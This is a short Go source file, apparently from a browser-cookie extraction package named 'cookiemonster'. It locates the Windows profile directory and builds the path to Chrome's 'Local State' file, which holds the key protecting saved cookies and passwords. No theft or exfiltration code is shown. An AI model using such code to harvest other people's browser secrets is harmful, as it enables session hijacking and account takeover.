package cookiemonster

import (
	"os"
	"path/filepath"
)

func getUserProfile() (string, error) {
	// First try USERPROFILE environment variable
	if profile := os.Getenv("USERPROFILE"); profile != "" {
		return filepath.Clean(profile), nil
	}

	// Fallback: construct from HOMEDRIVE and HOMEPATH
	drive := os.Getenv("HOMEDRIVE")
	path := os.Getenv("HOMEPATH")
	if drive != "" && path != "" {
		return filepath.Clean(drive + path), nil
	}

	return "", os.ErrNotExist
}

func BuildLocalStatePath() (string, error) {
	// Get the user profile directory
	profileDir, err := getUserProfile()
	if err != nil {
		return "", err
	}

	// Construct the Local State file path
	localStatePath := filepath.Join(profileDir, "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
	return localStatePath, nil
}
